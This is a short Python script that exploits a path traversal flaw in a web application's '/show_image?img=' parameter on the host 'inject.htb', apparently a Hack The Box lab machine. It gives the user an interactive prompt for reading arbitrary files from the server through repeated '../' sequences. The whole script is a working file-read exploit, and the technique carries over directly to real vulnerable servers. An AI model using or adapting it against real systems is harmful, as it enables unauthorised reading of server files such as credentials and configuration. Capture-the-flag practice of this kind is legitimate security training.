#!/usr/bin/env python3
import requests

def readFile(filePath):
    try:
        response = requests.get(f"http://inject.htb:8080/show_image?img=../../../../../../../../{filePath}", timeout=3)
    except requests.exceptions.ConnectionError:
        return "Permission denied"
    if response.status_code == 500:
        return "File not found"

    return response.text


def startInteractiveRead():
    print("Enter 'exit' to quit")
    while True:
        filePath = input("\n> ")
        if filePath == "exit":
            print("Quitting")
            break

        content = readFile(filePath)
        print(content)

def main():
    startInteractiveRead()


if __name__ == "__main__":
    main()
